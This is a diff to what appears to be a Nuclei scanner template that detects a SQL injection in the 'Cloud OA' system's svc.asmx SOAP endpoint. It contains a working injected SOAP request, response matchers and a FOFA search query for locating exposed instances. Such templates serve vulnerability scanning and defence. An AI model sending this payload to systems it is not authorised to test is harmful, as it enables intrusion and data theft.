@@ -1,42 +1,52 @@
 id: cloud-oa-system-sqli
 
 info:
-  name: Cloud OA system SQLi
+  name: Cloud OA System - SQL Injection
   author: SleepingBag945
   severity: high
-  description: cloud OA system /OA/PM/svc.asmx page parameters are not properly filtered, resulting in a SQL injection vulnerability, which can be used to obtain sensitive information in the database.
-  tags: cloudoa,sqli
+  description: |
+    cloud OA system /OA/PM/svc.asmx page parameters are not properly filtered, resulting in a SQL injection vulnerability, which can be used to obtain sensitive information in the database.
+  reference:
+    - https://github.com/GREENHAT7/pxplan/blob/e2fc04893ca95e177021ddf61cc2134ecc120a8e/xray_pocs/yaml-poc-eqccd-eqccd_oa-sql_injection-CT-456760.yml#L8
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: body="全程云办公" && body="/OA/WebResource.axd"
+  tags: cloud,cloudoa,sqli
+
+variables:
+  num: "999999999"
 
 http:
   - raw:
       - |
         POST /OA/PM/svc.asmx HTTP/1.1
         Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
         Content-Type: text/xml
-        Accept-Encoding: gzip, deflate
 
         <?xml version="1.0" encoding="utf-8"?>
         <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
           <soap:Body>
             <GetUsersInfo xmlns="http://tempuri.org/">
-              <userIdList>LOWER(CONVERT(VARCHAR(32),HashBytes('MD5','{{randstr}}'),2))</userIdList>
+              <userIdList>LOWER(CONVERT(VARCHAR(32),HashBytes('MD5','{{num}}'),2))</userIdList>
             </GetUsersInfo>
           </soap:Body>
         </soap:Envelope>
 
-
-
     matchers-condition: and
     matchers:
       - type: word
+        part: body
         words:
           - "System.Data.SqlClient.SqlException"
-          - "<?xml version="
-          - "{{md5('{{randstr}}')}}"
+          - "{{md5(num)}}"
         condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/xml
 
       - type: status
         status:
           - 500
-
